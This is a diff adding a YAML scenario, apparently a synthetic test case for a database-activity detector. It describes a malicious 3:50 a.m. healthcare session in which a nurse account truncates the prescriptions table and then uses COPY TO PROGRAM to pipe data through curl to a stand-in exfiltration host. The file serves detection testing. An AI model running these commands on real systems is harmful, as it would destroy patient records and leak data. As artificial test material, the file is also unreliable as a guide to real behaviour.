@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_52_data_tamper_mal_1473
+family_id: gen_healthcare_52_data_tamper_mal_fam1473
+domain: healthcare
+time_of_day: 03:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE prescriptions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.5.34.80
+      port: 445
